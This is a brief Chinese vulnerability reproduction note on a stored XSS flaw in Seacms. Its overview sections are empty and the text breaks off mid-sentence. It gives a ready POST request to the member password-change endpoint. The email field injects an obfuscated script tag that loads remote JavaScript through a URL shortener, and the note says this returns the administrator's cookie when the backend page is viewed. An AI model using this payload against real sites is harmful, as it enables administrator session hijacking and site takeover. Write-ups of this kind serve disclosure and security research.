Seacms 储存型xss
================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    POST /member.php?action=chgpwdsubmit

    oldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com<scbase64ript src=https://url.cn/585l00F></scrbase64ipt>&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9

### src的值为[http://127.0.0.1/test.js的短链接](http://127.0.0.1/test.js的短链接)

当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理
